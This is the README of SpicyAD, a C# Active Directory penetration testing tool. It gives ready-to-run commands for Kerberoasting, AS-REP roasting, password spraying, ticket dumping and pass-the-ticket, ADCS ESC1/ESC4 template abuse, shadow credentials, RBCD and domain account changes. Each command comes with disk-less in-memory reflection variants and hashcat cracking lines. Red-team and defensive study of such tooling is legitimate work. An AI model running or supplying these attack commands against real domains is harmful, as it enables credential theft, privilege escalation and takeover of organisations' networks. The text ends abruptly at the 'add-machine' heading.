# SpicyAD

```
░░░░░░░░░░░░░░▐█▀█▄░░░░░░░░░░▄█▀█▌░░░░░░░░░░░░░░
░░░░░░░░░░░░░░█▐▓░█▄░░░░░░░▄█▀▄▓▐█░░░░░░░░░░░░░░
░░░░░░░░░░░░░░█▐▓▓░████▄▄▄█▀▄▓▓▓▌█░░░░░░░░░░░░░░
░░░░░░░░░░░░▄█▌▀▄▓▓▄▄▄▄▀▀▀▄▓▓▓▓▓▌█░░░░░░░░░░░░░░
░░░░░░░░░░▄█▀▀▄▓█▓▓▓▓▓▓▓▓▓▓▓▓▀░▓▌█░░░░░░░░░░░░░░
░░░░░░░░░█▀▄▓▓▓███▓▓▓███▓▓▓▄░░▄▓▐█▌░░░░░░░░░░░░░
░░░░░░░░█▌▓▓▓▀▀▓▓▓▓███▓▓▓▓▓▓▓▄▀▓▓▐█░░░░░░░░░░░░░
░░░░░░░▐█▐██▐░▄▓▓▓▓▓▀▄░▀▓▓▓▓▓▓▓▓▓▌█▌░░░░░░░░░░░░
░░░░░░░█▌███▓▓▓▓▓▓▓▓▐░░▄▓▓███▓▓▓▄▀▐█░░░░░░░░░░░░
░░░░░░░█▐█▓▀░░▀▓▓▓▓▓▓▓▓▓██████▓▓▓▓▐█▌░░░░░░░░░░░
░░░░░░░▓▄▌▀░▀░▐▀█▄▓▓██████████▓▓▓▌█░░░░░░░░░░░░░
   _____ ____  ___ ______   __     _    ____
  / ___// __ \/  _/ ____/\ \/ /   / \  |  _ \
  \__ \/ /_/ // // /      \  /   / _ \ | | | |
 ___/ / ____// // /___    / /   / ___ \| |_| |
/____/_/   /___/\____/   /_/   /_/   \_\____/
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░Active Directory Penetration Testing Tool░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
```
![demo](https://raw.githubusercontent.com/RayRRT/SpicyAD/refs/heads/master/demo3.gif)

---

## Table of Contents

- [Description](#description)
- [Features](#features)
- [Installation](#installation)
- [Execution](#execution)
  - [Interactive Mode](#interactive-mode)
  - [Command-Line Mode](#command-line-mode)
  - [Reflection (In-Memory)](#reflection-in-memory)
- [Global Options](#global-options)
- [Connection Flags](#connection-flags)
- [Commands](#commands)
  - [Enumeration](#enumeration)
    - [bloodhound](#bloodhound)
    - [domain-info](#domain-info)
    - [enum-dcs](#enum-dcs)
    - [enum-users](#enum-users)
    - [enum-computers](#enum-computers)
    - [enum-shares](#enum-shares)
    - [find-shares](#find-shares)
    - [domain-trusts](#domain-trusts)
    - [delegations](#delegations)
    - [laps](#laps)
    - [enum-vulns](#enum-vulns)
    - [enum-certs](#enum-certs)
  - [Attacks](#attacks)
    - [kerberoast](#kerberoast)
    - [asreproast](#asreproast)
    - [targeted-kerberoast](#targeted-kerberoast)
    - [spray](#spray)
    - [dump](#dump)
    - [ptt](#ptt)
    - [asktgt](#asktgt)
    - [esc1](#esc1)
    - [esc4](#esc4)
    - [shadow-creds](#shadow-creds)
    - [rbcd](#rbcd)
    - [add-user](#add-user)
    - [delete-user](#delete-user)
    - [add-machine](#add-machine)
    - [add-to-group](#add-to-group)
    - [change-password](#change-password)
- [Attack Workflows](#attack-workflows)
- [References](#references)
- [Legal Disclaimer](#legal-disclaimer)

---

## Disclaimer: This tool was created using my knowledge of Kerberos and Active Directory, together with assistance from Claude-Code. We both may be wrong, so research, test, and modify as needed, it’s your responsibility :)

## Description

SpicyAD is a C# Active Directory penetration testing tool designed for authorized security assessments. It combines multiple AD attack techniques into a single, easy-to-use tool with both interactive and command-line interfaces.

| Category | Capabilities |
|----------|--------------|
| **Enumeration** | Domain info, DCs, users, computers, shares (SYSVOL/NETLOGON/all), trusts, delegations (Unconstrained/Constrained/RBCD), LAPS, certificate templates (ESC1-4, ESC8), **BloodHound Ingestor** |
| **Kerberos Attacks** | Kerberoasting (RC4/AES), AS-REP Roasting, Password Spray, Pass-the-Ticket, Targeted Kerberoasting |
| **ADCS Attacks** | ESC1 (arbitrary SAN), ESC4 (Template Hijacking), PKINIT + UnPAC-the-hash |
| **Credentials** | Shadow Credentials, RBCD |
| **AD Management** | Add/delete users, add machines, group management, password changes |

**Automatic Attack Chains:**

| Chain | Flow |
|-------|------|
| ESC4 full | Modify template → ESC1 → PKINIT → Restore |
| ESC1 | Request cert → PKINIT → Extract NT hash |
| Shadow Creds | Add shadow cred → PKINIT → Extract NT hash |
| Targeted Kerberoast | Set SPN → Kerberoast → Restore |
| Password Spray | Enum users + badPwdCount → spray |

---

## Installation

### Requirements
- .NET Framework 4.8
- Windows environment

### Build
```powershell
# Using dotnet CLI
dotnet build SpicyAD.csproj -c Release

# Using MSBuild
msbuild SpicyAD.csproj /p:Configuration=Release
```

### Or just compile with VS
```
bin\Release\net48\SpicyAD.exe
```

---

## Execution

SpicyAD supports three execution methods:

| Method | Use Case |
|--------|----------|
| **Domain-Joined** | Running from a machine joined to the target domain |
| **Non-Domain-Joined** | Running from a workgroup machine or different domain |
| **Reflection** | In-memory execution without touching disk |

### Interactive Mode

```powershell
# Domain-Joined
.\SpicyAD.exe

# Non-Domain-Joined
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd

# Reflection
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Run()
```

### Command-Line Mode

```powershell
.\SpicyAD.exe [command] [options]
```

### Reflection (In-Memory)

Execute SpicyAD without writing to disk using .NET Reflection:

```powershell
# Load assembly
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe")

# Execute command
[SpicyAD.Program]::Execute("command", "arg1", "arg2")

# Interactive menu
[SpicyAD.Program]::Run()
```

---

## Global Options

| Option | Description |
|--------|-------------|
| `/verbose`, `-v` | Show detailed output |
| `/log` | Save output to log file (current directory) |
| `/log:<path>` | Save output to specified path |

---

## Connection Flags

Required for non-domain-joined machines:

| Flag | Description | Example |
|------|-------------|---------|
| `/domain:<fqdn>` | Target domain FQDN | `/domain:evilcorp.net` |
| `/dc-ip:<ip>` | Domain Controller IP | `/dc-ip:10.10.10.10` |
| `/user:<user>` | Username for auth | `/user:elliot` |
| `/password:<pwd>` | Password for auth | `/password:P@ssw0rd` |
| `/dns:<ip>` | DNS server (optional) | `/dns:10.10.10.10` |
| `/ldaps`, `/ssl` | Use LDAPS (SSL/TLS, port 636) | `/ldaps` |

---

## Commands

### Enumeration

---

#### bloodhound

BloodHound Ingestor - Collect AD data for BloodHound CE analysis. Generates JSON files compatible with BloodHound Community Edition.

| Option | Description |
|--------|-------------|
| `/collection:<method>` | Collection method(s) - see table below |
| `/outputdir:<path>` | Output directory (default: current) |
| `/zipfilename:<name>` | Custom ZIP filename |
| `/threads:<n>` | Threads for session/local group enum (default: 10) |
| `/stealth` | Skip session and local group enumeration |
| `/pretty` | Pretty-print JSON (larger files) |

**Collection Methods:**

| Method | Description |
|--------|-------------|
| `default` | Group, Session, Trusts, ACL, ObjectProps, Container, LocalAdmin |
| `all` | All collection methods |
| `dconly` | Group, ACL, Trusts, ObjectProps, Container (no computer enum) |
| `session` | Network session enumeration (NetSessionEnum) |
| `localgroup` | Local group membership (LocalAdmin, RDP, DCOM, PSRemote) |
| `group` | Group membership enumeration |
| `acl` | Access Control List collection |
| `trusts` | Domain trust enumeration |
| `container` | OU, GPO, and container enumeration |
| `computeronly` | Session and local group enum only |
| `certservices` | Certificate Templates and Enterprise CAs |

> **Note:** Methods can be combined with comma: `/collection:group,acl,session`

**Domain-Joined:**
```powershell
# Default collection
.\SpicyAD.exe bloodhound

# All collection methods
.\SpicyAD.exe bloodhound /collection:all

# Stealth mode (LDAP only, no computer enumeration)
.\SpicyAD.exe bloodhound /collection:dconly /stealth

# Session enumeration with 20 threads
.\SpicyAD.exe bloodhound /collection:session /threads:20

# Custom output
.\SpicyAD.exe bloodhound /outputdir:C:\loot /zipfilename:target.zip

# Only certificate services
.\SpicyAD.exe bloodhound /collection:certservices
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd bloodhound
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd bloodhound /collection:all
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd bloodhound /collection:dconly /stealth
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("bloodhound")
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("bloodhound", "/collection:all")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "bloodhound")
```

**Output:** ZIP file containing JSON files for import into BloodHound CE.

---

#### domain-info

Get domain information including name, mode, forest, and machine account quota.

**Domain-Joined:**
```powershell
.\SpicyAD.exe domain-info
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd domain-info
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("domain-info")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "domain-info")
```

---

#### enum-dcs

Enumerate domain controllers with IPs, OS versions, sites, and roles.

**Domain-Joined:**
```powershell
.\SpicyAD.exe enum-dcs
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd enum-dcs
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("enum-dcs")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "enum-dcs")
```

---

#### enum-users

Enumerate domain users with security-relevant flags (DONT_REQ_PREAUTH, HAS_SPN, DISABLED).

**Domain-Joined:**
```powershell
.\SpicyAD.exe enum-users
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd enum-users
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("enum-users")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "enum-users")
```

---

#### enum-computers

Enumerate domain computers with IP resolution.

**Domain-Joined:**
```powershell
.\SpicyAD.exe enum-computers
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd enum-computers
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("enum-computers")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "enum-computers")
```

---

#### enum-shares

Enumerate SYSVOL/NETLOGON shares with interesting file detection.

**Domain-Joined:**
```powershell
.\SpicyAD.exe enum-shares
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd enum-shares
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("enum-shares")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "enum-shares")
```

---

#### find-shares

Enumerate shares on all domain computers or a specific host.

**Domain-Joined:**
```powershell
.\SpicyAD.exe find-shares
.\SpicyAD.exe find-shares /target:SERVER01
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd find-shares
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd find-shares /target:SERVER01
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("find-shares")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "find-shares")
```

---

#### domain-trusts

Enumerate domain trust relationships.

**Domain-Joined:**
```powershell
.\SpicyAD.exe domain-trusts
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd domain-trusts
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("domain-trusts")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "domain-trusts")
```

---

#### delegations

Enumerate all Kerberos delegations (Unconstrained, Constrained, RBCD).

**Domain-Joined:**
```powershell
.\SpicyAD.exe delegations
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd delegations
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("delegations")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "delegations")
```

---

#### laps

Read LAPS passwords (all computers or specific target).

**Domain-Joined:**
```powershell
.\SpicyAD.exe laps
.\SpicyAD.exe laps /target:WORKSTATION01
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd laps
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd laps /target:WORKSTATION01
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("laps")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "laps")
```

---

#### enum-vulns

Enumerate vulnerable certificate templates (ESC1-4, ESC8).

**Domain-Joined:**
```powershell
.\SpicyAD.exe enum-vulns
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd enum-vulns
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("enum-vulns")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "enum-vulns")
```

---

#### enum-certs

Enumerate all certificate templates (Certify-style output).

**Domain-Joined:**
```powershell
.\SpicyAD.exe enum-certs
.\SpicyAD.exe enum-certs /out:certs.txt
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd enum-certs
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("enum-certs")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "enum-certs")
```

---

### Attacks

---

#### kerberoast

Extract TGS hashes for offline cracking.

**Domain-Joined:**
```powershell
.\SpicyAD.exe kerberoast
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd kerberoast
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("kerberoast")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "kerberoast")
```

**Crack with Hashcat:**
```bash
hashcat -m 13100 hash.txt wordlist.txt  # RC4
hashcat -m 19600 hash.txt wordlist.txt  # AES128
hashcat -m 19700 hash.txt wordlist.txt  # AES256
```

---

#### asreproast

Target users without pre-authentication required.

**Domain-Joined:**
```powershell
.\SpicyAD.exe asreproast
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd asreproast
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("asreproast")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "asreproast")
```

**Crack with Hashcat:**
```bash
hashcat -m 18200 hash.txt wordlist.txt
```

---

#### targeted-kerberoast

Set SPN on users you have write access to, then Kerberoast them.

**Domain-Joined:**
```powershell
.\SpicyAD.exe targeted-kerberoast
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd targeted-kerberoast
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("targeted-kerberoast")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "targeted-kerberoast")
```

---

#### spray

Kerberos-based password spraying.

**Domain-Joined:**
```powershell
.\SpicyAD.exe spray /password:Summer2024!
.\SpicyAD.exe spray /password:Summer2024! /delay:1000
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd spray /password:Summer2024!
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("spray", "/password:Summer2024!")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "spray", "/password:Summer2024!")
```

---

#### dump

Dump Kerberos tickets from memory.

**Domain-Joined:**
```powershell
.\SpicyAD.exe dump
.\SpicyAD.exe dump /user:administrator
.\SpicyAD.exe dump /service:krbtgt
.\SpicyAD.exe dump /nowrap
```

**Non-Domain-Joined:**
```powershell
# Does not require domain context - uses local LSA
.\SpicyAD.exe dump
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("dump")
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("dump", "/nowrap")
```

---

#### ptt

Pass-the-Ticket - Import .kirbi tickets into current session.

**Domain-Joined:**
```powershell
.\SpicyAD.exe ptt administrator.kirbi
.\SpicyAD.exe ptt /ticket:administrator.kirbi
```

**Non-Domain-Joined:**
```powershell
# Does not require domain context - uses local LSA
.\SpicyAD.exe ptt administrator.kirbi
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("ptt", "/ticket:administrator.kirbi")
```

---

#### asktgt

PKINIT - Request TGT using certificate and extract NT hash.

**Domain-Joined:**
```powershell
.\SpicyAD.exe asktgt /certificate:admin.pfx /getcredentials
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 asktgt /certificate:admin.pfx /getcredentials
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("asktgt", "/certificate:admin.pfx", "/getcredentials")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "asktgt", "/certificate:admin.pfx", "/getcredentials")
```

---

#### esc1

ESC1 - Request certificate with arbitrary SAN (Subject Alternative Name).

> **Important:** Use `/sid` flag for modern DCs with KB5014754 (Strong Certificate Mapping).

**Domain-Joined:**
```powershell
.\SpicyAD.exe esc1 /template:VulnTemplate /target:administrator
.\SpicyAD.exe esc1 /template:VulnTemplate /target:administrator /sid
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:lowpriv /password:P@ssw0rd esc1 /template:VulnTemplate /target:administrator /sid
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("esc1", "/template:VulnTemplate", "/target:administrator", "/sid")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:lowpriv", "/password:P@ssw0rd", "esc1", "/template:VulnTemplate", "/target:administrator", "/sid")
```

---

#### esc4

ESC4 - Template Hijacking. Full attack chain: Backup → Modify → ESC1 → Restore.

> **Important:** Use `/sid` flag for modern DCs with KB5014754 (Strong Certificate Mapping).

**Domain-Joined:**
```powershell
# List ESC4 vulnerable templates
.\SpicyAD.exe esc4 list

# Full attack chain
.\SpicyAD.exe esc4 /template:VulnTemplate /target:administrator /sid

# Manual steps
.\SpicyAD.exe esc4 backup VulnTemplate
.\SpicyAD.exe esc4 modify VulnTemplate
.\SpicyAD.exe esc1 /template:VulnTemplate /target:administrator /sid
.\SpicyAD.exe esc4 restore VulnTemplate_backup.json
```

**Non-Domain-Joined:**
```powershell
# List ESC4 vulnerable templates
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:lowpriv /password:P@ssw0rd esc4 list

# Full attack chain
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:lowpriv /password:P@ssw0rd esc4 /template:VulnTemplate /target:administrator /sid
```

**Reflection:**
```powershell
# List ESC4 vulnerable templates
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("esc4", "list")

# Full attack chain
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("esc4", "/template:VulnTemplate", "/target:administrator", "/sid")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:lowpriv", "/password:P@ssw0rd", "esc4", "/template:VulnTemplate", "/target:administrator", "/sid")
```

---

#### shadow-creds

Shadow Credentials attack via msDS-KeyCredentialLink.

> **Important:** Use `/sid` flag for modern DCs with KB5014754 (Strong Certificate Mapping).

**Domain-Joined:**
```powershell
# Add shadow credential
.\SpicyAD.exe shadow-creds add /target:VICTIM$ /sid

# List credentials
.\SpicyAD.exe shadow-creds list /target:VICTIM$

# Remove specific credential
.\SpicyAD.exe shadow-creds remove /target:VICTIM$ /deviceid:<guid>

# Clear all credentials
.\SpicyAD.exe shadow-creds clear /target:VICTIM$
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:lowpriv /password:P@ssw0rd shadow-creds add /target:VICTIM$ /sid
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:lowpriv /password:P@ssw0rd shadow-creds list /target:VICTIM$
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("shadow-creds", "add", "/target:VICTIM$", "/sid")
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("shadow-creds", "list", "/target:VICTIM$")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:lowpriv", "/password:P@ssw0rd", "shadow-creds", "add", "/target:VICTIM$", "/sid")
```

---

#### rbcd

Resource-Based Constrained Delegation attack.

**Domain-Joined:**
```powershell
# Get current RBCD configuration
.\SpicyAD.exe rbcd get /target:SERVER$

# Set RBCD
.\SpicyAD.exe rbcd set /target:SERVER$ /controlled:YOURPC$

# Clear RBCD
.\SpicyAD.exe rbcd clear /target:SERVER$ /force
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:lowpriv /password:P@ssw0rd rbcd get /target:SERVER$
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:lowpriv /password:P@ssw0rd rbcd set /target:SERVER$ /controlled:YOURPC$
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("rbcd", "get", "/target:SERVER$")
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("rbcd", "set", "/target:SERVER$", "/controlled:YOURPC$")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:lowpriv", "/password:P@ssw0rd", "rbcd", "set", "/target:SERVER$", "/controlled:YOURPC$")
```

---

#### add-user

Add a new user account to the domain.

**Domain-Joined:**
```powershell
.\SpicyAD.exe add-user /name:newuser /new-pass:P@ssw0rd123
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd add-user /name:newuser /new-pass:P@ssw0rd123
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("add-user", "/name:newuser", "/new-pass:P@ssw0rd123")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "add-user", "/name:newuser", "/new-pass:P@ssw0rd123")
```

---

#### delete-user

Delete a user account from the domain.

**Domain-Joined:**
```powershell
.\SpicyAD.exe delete-user /target:baduser
.\SpicyAD.exe delete-user /target:baduser /force
```

**Non-Domain-Joined:**
```powershell
.\SpicyAD.exe /domain:evilcorp.net /dc-ip:10.10.10.10 /user:admin /password:P@ssw0rd delete-user /target:baduser /force
```

**Reflection:**
```powershell
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("delete-user", "/target:baduser", "/force")

# Non-Domain-Joined
[Reflection.Assembly]::LoadFile("C:\Users\Public\SpicyAD.exe") | Out-Null; [SpicyAD.Program]::Execute("/domain:evilcorp.net", "/dc-ip:10.10.10.10", "/user:admin", "/password:P@ssw0rd", "delete-user", "/target:baduser", "/force")
```

---

#### add-machine

